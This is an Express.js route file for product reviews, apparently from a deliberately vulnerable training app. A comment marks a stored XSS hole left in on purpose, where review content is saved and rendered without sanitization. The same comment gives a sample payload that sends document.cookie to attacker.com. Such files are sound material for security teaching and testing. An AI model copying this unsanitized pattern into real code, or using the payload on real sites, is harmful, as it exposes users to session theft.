const express = require('express');
const { db } = require('../models/db');
const { requireAuth } = require('../middleware/auth');

const router = express.Router();

router.get('/:productId', (req, res) => {
  const reviews = db.prepare(
    'SELECT * FROM reviews WHERE product_id = ? ORDER BY created_at DESC'
  ).all(req.params.productId);
  res.json(reviews);
});

// [VULN-V03: Stored XSS — CWE-79 — review content stored without sanitization, rendered with <%- %> in product.ejs]
// Exploit: POST /api/reviews { content: "<script>document.location='https://attacker.com/?c='+document.cookie</script>" }
router.post('/', requireAuth, (req, res) => {
  const { productId, content, rating } = req.body;
  if (!productId || !content) {
    return res.status(400).json({ error: 'productId and content required' });
  }
  const product = db.prepare('SELECT id FROM products WHERE id = ?').get(productId);
  if (!product) return res.status(404).json({ error: 'Product not found' });

  db.prepare(
    'INSERT INTO reviews (product_id, user_id, username, content, rating) VALUES (?, ?, ?, ?, ?)'
  ).run(productId, req.user.id, req.user.username, content, rating || 5);

  if (req.headers['content-type'] === 'application/json') {
    return res.status(201).json({ message: 'Review posted' });
  }
  res.redirect('/products/' + productId);
});

module.exports = router;
